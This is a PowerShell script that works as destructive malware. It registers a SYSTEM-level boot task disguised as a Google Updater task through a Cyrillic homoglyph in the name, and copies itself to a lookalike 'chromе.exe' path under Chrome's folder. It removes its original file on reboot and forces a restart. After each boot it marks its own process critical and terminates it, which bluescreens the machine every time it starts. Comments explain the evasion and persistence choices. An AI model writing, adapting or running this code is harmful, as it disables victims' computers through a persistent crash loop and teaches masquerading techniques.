$taskName = "GooglеUpdaterTaskSystem87.0.4280.141{DD2BAB31-B49A-4981-BB41-9C83CB6B6235}"
$taskExist = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
$taskPath = "C:\Program Files\Google\Chrome\Application\chromе.exe"
$taskPathExist = Test-Path -Path $taskPath

# Add to Task Scheduler (if not exist)
# DO NOT use `Register-ScheduledTask`, as the Cyrilic character is not supported.
if (!$taskExist) {
    $xmlPath = "$Env:Tmp\xml_file.xml"
    $xmlContent = '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><RegistrationInfo><Author>NT AUTHORITY\SYSTEM</Author><Description>GoogleUpdater Task System 87.0.4280.141</Description><URI>\GooglеUpdaterTaskSystem87.0.4280.141{DD2BAB31-B49A-4981-BB41-9C83CB6B6235}</URI></RegistrationInfo><Principals><Principal id="Author"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy><IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings></Settings><Triggers><BootTrigger /></Triggers><Actions Context="Author"><Exec><Command>"C:\Program Files\Google\Chrome\Application\chromе.exe"</Command></Exec></Actions></Task>'
    [System.IO.File]::WriteAllText($xmlPath, $xmlContent, [System.Text.Encoding]::Unicode)
    schtasks.exe /create /tn $taskName /xml $xmlPath /f
    Remove-Item -Path $xmlPath
}

# Move file if not executed in folder where task is scheduled
if (!$taskPathExist) {
    $executablePath = (Get-CimInstance "Win32_Process" -Filter "ProcessId = $PID").ExecutablePath
    New-Item -ItemType Directory "C:\Program Files\Google\Chrome\Application"
    Copy-Item $executablePath -Destination $taskPath

    $DynAssembly = New-Object System.Reflection.AssemblyName("DeleteFileOnReboot")
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule("DeleteFileOnReboot", $False)
    $TypeBuilder = $ModuleBuilder.DefineType("DeleteFileOnReboot.Win32.kernel32", "Public, Class")

    # Define [kernel32]::MoveFileExW method

    # MoveFileExW is explicitly called, as calling MoveFileEx may implicitly call MoveFileExA,
    # which supports only ANSI and not wide/Unicode characters (required for Cyrillic).

    # Unlike the alternative implementation (see below), the $null
    # variable does not work, instead requiring [NullString]::Value.
    # See why here: https://stackoverflow.com/questions/51294535/why-does-nullstringvalue-evaluate-differently-with-a-breakpoint#:~:text=As%20for%20why,many%20existing%20scripts.).

    # Alternate Method (not chosen because of embedded code, which is difficult to modify):
    # - https://devblogs.microsoft.com/scripting/weekend-scripter-use-powershell-and-pinvoke-to-remove-stubborn-files
    # - https://web.archive.org/web/20131013083115/http://gallery.technet.microsoft.com/scriptcenter/Register-FileToDelete-0cbb00bb/file/97349/1/Register-FileToDelete.ps1
    # - https://www.leeholmes.com/moving-and-deleting-really-locked-files-in-powershell

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod(
        "MoveFileExW",
        "kernel32.dll",
        [Reflection.MethodAttributes] "Public, Static",
        [System.Reflection.CallingConventions]::Standard,
        [Boolean],
        [Type[]] @([String], [String], [UInt32]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Unicode
    )

    $kernel32 = $TypeBuilder.CreateType()
    $destination = [NullString]::Value
    $flags = 4 # MOVEFILE_DELAY_UNTIL_REBOOT

    $kernel32::MoveFileExW($executablePath, $destination, $flags)

    # Debugging:
    # When running directly in PowerShell, a Boolean response will be printed to the CLI (for success or failure).
    # However, it will always be $false unless the following line is added after $PInvokeMethod is defined:
    # $PInvokeMethod.SetImplementationFlags([System.Reflection.MethodImplAttributes]::PreserveSig)
}

if (!$taskExist -or !$taskPathExist) {
    Restart-Computer
    Start-Sleep -Seconds 10
    Stop-Process $PID
}

$DynAssembly = New-Object System.Reflection.AssemblyName("BlueScreen")
$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule("BlueScreen", $False)
$TypeBuilder = $ModuleBuilder.DefineType("BlueScreen.Win32.ntdll", "Public, Class")

# Define [ntdll]::NtQuerySystemInformation method
$PInvokeMethod = $TypeBuilder.DefinePInvokeMethod(
    "NtSetInformationProcess",
    "ntdll.dll",
    [Reflection.MethodAttributes] "Public, Static",
    [Reflection.CallingConventions]::Standard,
    [Int32],
    [Type[]] @([IntPtr], [UInt32], [IntPtr].MakeByRefType(), [UInt32]),
    [Runtime.InteropServices.CallingConvention]::Winapi,
    [Runtime.InteropServices.CharSet]::Auto
)

$ntdll = $TypeBuilder.CreateType()
$ProcHandle = [Diagnostics.Process]::GetCurrentProcess().Handle
$ReturnPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)

$ProcessBreakOnTermination = 29
$SizeUInt32 = 4

try {
    $null = $ntdll::NtSetInformationProcess($ProcHandle, $ProcessBreakOnTermination, [Ref] $ReturnPtr, $SizeUInt32)
} catch {
    return
}

Stop-Process $PID